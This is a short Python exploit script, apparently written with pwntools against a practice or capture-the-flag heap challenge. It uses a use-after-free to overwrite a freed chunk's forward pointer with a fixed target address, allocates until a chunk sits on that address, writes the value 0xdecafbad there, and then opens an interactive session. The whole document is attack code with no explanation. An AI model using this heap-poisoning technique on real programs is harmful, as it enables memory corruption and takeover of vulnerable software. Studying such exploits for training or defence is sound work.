# coding: utf-8
checktarget()
TARGET = 0x5581129ff090
malloc(0, 24, b"first")
malloc(1, 24, b"second")
malloc(2, 24, b"BARRIER")
free(0)
free(1)
edit(1, p64(TARGET))
malloc(3, 24, b"whatevs")
malloc(4, 24, p64(0xdecafbad))
checktarget()
p.interactive()
